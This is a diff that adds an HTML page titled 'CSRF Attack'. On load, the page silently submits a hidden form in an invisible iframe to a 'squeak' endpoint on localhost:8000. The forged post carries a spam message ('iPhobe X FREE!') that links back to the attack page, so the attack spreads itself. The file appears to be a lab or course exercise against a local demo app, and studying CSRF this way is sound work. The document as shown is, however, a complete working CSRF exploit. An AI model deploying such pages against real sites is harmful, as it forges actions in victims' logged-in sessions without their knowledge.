@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>CSRF Attack</title>
+  </head>
+  <body onload="document.csrfForm.submit()">
+    <h1>CSRF Attack</h1>
+    <form action="https://localhost:8000/squeak" method="POST" target="hiddenFrame" name="csrfForm">
+      <input type="hidden" name="squeak" value="Click <a href='https://localhost:8000/csrfAttack.html'>here</a> to get the iPhobe X FREE!" />
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+  </body>
+</html>
+
